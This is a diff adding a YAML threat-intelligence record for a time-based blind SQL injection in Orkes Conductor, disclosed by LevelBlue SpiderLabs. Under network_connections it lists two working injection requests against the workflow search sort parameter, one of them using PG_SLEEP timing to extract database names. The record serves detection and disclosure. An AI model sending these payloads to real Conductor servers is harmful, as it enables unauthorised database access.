@@ -1,0 +1,26 @@
+description: LevelBlue SpiderLabs discovered a time-based blind SQL injection vulnerability
+  in Orkes Conductor platform version 5.2.4 | v1.19.12.
+TTPs:
+  processes: []
+  commandline: []
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - GET /api/workflow/search?sort=(SELECT+1371+FROM+PG_SLEEP(5))
+  - GET /api/workflow/search?sort=(SELECT+1+%2B+CASE+WHEN+(SELECT+ASCII(SUBSTRING(datname,1,1))+FROM+pg_database+LIMIT+1+OFFSET+0)+%3D+112+THEN+PG_SLEEP(5)+ELSE+0+END)
+  file_activity: []
+  persistence: []
+  process_relations: []
+IOCs:
+  hashes: []
+  ip_addresses: []
+  domains: []
+  urls:
+  - https://levelblue.com/hs-fs/hubfs/Blogs/SpiderLab_Blog_Images/Figure%201.%20PoC%20request%20resulted%20in%20a%20five-second%20delay%20in%20the%20server%E2%80%99s%20response.jpg?width=682&height=268&name=Figure%201.%20PoC%20request%20resulted%20in%20a%20five-second%20delay%20in%20the%20server%E2%80%99s%20response.jpg
+authors:
+- Timothy Stamopoulos
+reference: https://levelblue.com/blogs/spiderlabs-blog/levelblue-spiderlabs-sql-injection-in-orkes-conductor-cve-2025-66387/
+date_of_publication: December 18, 2025
+file_creation_date: December 19, 2025
